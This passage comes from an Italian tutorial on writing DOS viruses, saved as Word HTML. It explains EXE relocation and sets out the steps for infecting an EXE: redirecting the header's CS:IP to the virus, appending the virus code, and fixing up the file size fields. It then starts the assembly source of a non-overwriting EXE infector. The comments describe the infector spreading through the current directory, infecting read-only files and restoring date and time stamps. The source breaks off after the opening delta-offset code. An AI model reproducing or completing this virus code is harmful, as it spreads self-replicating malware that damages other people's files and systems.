mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_3._La_rilocazione"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>3. La rilocazione<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>La
rilocazione del programma è effettuata dalla funzione DOS (4bh) e contiene i
seguenti punti:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>1) Crea un
PSP con la funzione DOS<span style="mso-spacerun: yes">  </span>26h;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>2) Legge
1Ch bytes dall’EXE (la porzione formattata dell’header) in una area di memoria;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>3) Determina
la misura del modulo load = ((PageCnt*512)-(HdrSize*16))-PartPag;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>4)
Determina l’indirizzo del modulo load = (HdrSize*16);<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>5)
Seleziona un indirizzo di segmento START_SEG per il caricamento (di solito
PSP+10h);<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>6) Legge
il modulo load nella memoria partendo da START_SEG:0000;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>7) LSEEK
(set file pointer) all’indirizzo della tabella di rilocazione (TablOff);<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>8) per
ogni elemento di rilocazione (ReloCnt):<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span>- legge
l’elemento come due 16-bit words (I_OFF,I_SEG)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span>- trova
l’indirizzo di rilocazione ref RELO_SEG=(START_SEG+I_SEG)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span>- legge
il valore corrente, la word dall’indirizzo RELO_SEG:I_OFF<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span>-
performa il segment fixup aggiungendo START_SEG a quella word<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span>- salva
il vaolre al suo indirizzo priginale (RELO_SEG:I_OFF)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>9) Alloca
memoria per il programma accordando MinMem e MaxMem<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>10)
Initializza i registri e esegue il programma:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">      </span></span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>-
ES=DS=PSP<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">      </span>- SS=START_SEG+ReloSS<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">      </span>- SP=ExeSP<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">      </span>- CS=START_SEG+ReloCS<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">      </span></span><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>- IP=ExeIP<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>Nota:
l’inizializzazione di CS e IP è fatta con<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span></span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>PUSH
START_SEG+ReloCS<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">     </span></span><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>PUSH ExeIP<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>RETF<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span>La
principale differenza tra l’infezione di un COM e di un EXE è che l’EXE ha
bisogno di qualche calcolo. La replicazione di un COM avveniva salvando i primi
3 (o più) bytes dall’inizio del programma in un buffer, andare quindi alla fine
del programma, scriverci il codice virale, costruire un’istruzione JMP con la
locazione della fine del programma (e di inizio del codice virale), scrivere un
JUMP all’inizio del programma e finalmente ridare il controllo al programma
host.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Il processo infettivo di un EXE segue questi
passaggi:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>leggere
l’header dell’EXE<span style="mso-spacerun: yes">  </span>e caricarlo in un
buffer di 1ch bytes;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>salvare
dall’header alcuni valori di cui avremo bisogno quando ripasseremo il controllo
all’host ReloSS, ExeSP, ExeIP and ReloCS da 0eh, 10h, 14h and 16h -
rispettivamente I registri SS, SP, IP and CS);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>calcolare
I nuovi valori (offsets) per il segmento di stack (SS) e il segmento di codice
(CS), aggiustare il registro IP;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>andare
a EOF e scrivere il codice del virus;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>calcolare
I nuovi valori di PartPag (offset 02h) e PageCnt (offset 04h);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>andare
a BOF (inizio file) e sovrascrivere il vecchio header con la nostra copia
modificata;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l1 level1 lfo4;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>7.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>passare
il controllo all’host resettando lo stack al valore originario e ripsristinando
il CS:IP al punto dell’originale entry point, e DS e ES al punto del PSP.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>Cosa
significa calcolare i nuovi valori del CS:IP ?<span style="mso-spacerun: yes"> 
</span>CS:IP=ReloCS:ExeIP; ReloCS=indirizzo del segmento codice... questo
valore rappresenta l’indirizzo del codice del programma. Perché viene<span
style="mso-spacerun: yes">  </span>modificato ? Il processo infettivo deve
effettuare un JUMP al codice virus. Questo non può essere fatto come con un
file COM, inserendo un JMP all’inizio del file. In un EXE si fa in modo che
ReloCS punti al<span style="mso-spacerun: yes">  </span>virus invece che al
codice dell’host. Poi, quando il virus ha terminato il suo lavoro, il processo
passerà il controllo all’host ripristinando il vecchio valore di ReloCS (in
memoria, non sul disco).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>ExeIP=valore per il registro IP quando il programma
parte... ma che cosa è questo registro ? Il registro IP contiene l’indirizzo
dell’istruzione corrente. Così, viene modifato questo registro per fare in modo
che punti alla prima istruzione del virus (l’entry point del virus).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Questa è la parte del calcolo di CS e IP. Il
registro del segmento di stack SS (stack segment) dovrebbe essere uguale al
registro CS (code segment), così dopo che è trovato il valore di CS, SS sarà
uguale.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Un’altra cosa che deve essere modificata nell’header
è PartPag e PageCnt. Dato che il file è aumentato in dimensioni, si ricalcola
la misura di esso riscrivendo i nuovi valori.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_4._Un_esempio"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>4. Un esempio<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Esempio- Virus EXE infettore non sovrascrittore.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;********************************************************************************<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; Name:
Esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; Type:
EXE Infettore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; Size:
472 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; il virus
cerca files EXE nella directory corrente. Se non trova files, il virus<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; ritorna
il controllo all’host. Se trovaun file, prova ad infettarlo. Se il file<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;è già
stato infettato, lo chiude e ne cerca un altro. Il ciclo si ripete fino a <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;che tutti
gli EXE della dir. corrente non sono infettati. Il virus infetta read-<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;only files
e ripsristina gli attributi time/date.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;Il virus
controlla se: - il file è realmente un EXE (MZ scan)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<span
style="mso-spacerun: yes">                       </span>- il file è un Windows
EXE<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<span
style="mso-spacerun: yes">                       </span>- il file ha internal
overlays<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
Assemblato con: tasm esempio.asm<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=DE style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
DE'>;<span style="mso-spacerun: yes">                 </span>tlink /t
esempio.obj<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=DE
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
DE'><span style="mso-spacerun: yes">   </span></span></b><b><span lang=FR
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'>;********************************************************************************<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=FR
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'><span style="mso-spacerun: yes">   </span>code segment<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=FR
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'><span style="mso-spacerun: yes">      </span>assume cs:code,ds:code<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=FR
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>org 100h<span
style="mso-spacerun: yes">                      </span>;comincia a 100h =&gt;
1st host sarà un COM<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>virus_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>db 0e9h,3,0<span
style="mso-spacerun: yes">                   </span>;jump all’inizio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>our_host:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>db 0cdh,20h,0<span
style="mso-spacerun: yes">                 </span>;=Int 20h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>begin:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>call find_offset<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>find_offset:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;
-------------------- Punto 1 – Calcolo il DELTA offset -----------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">     </span>pop bp<span style="mso-spacerun:
yes">                        </span>;bp contiene IP all’inizio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>sub bp,offset find_offset<span style="mso-spacerun: yes">    
</span>;=&gt;bp=delta offset<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>push ds es<span
style="mso-spacerun: yes">                    </span>;salvo gli originali DS e
ES<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>push cs <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>pop ds<span
style="mso-spacerun: yes">                        </span>;CS=DS<o:p></o:p></span></b></p>

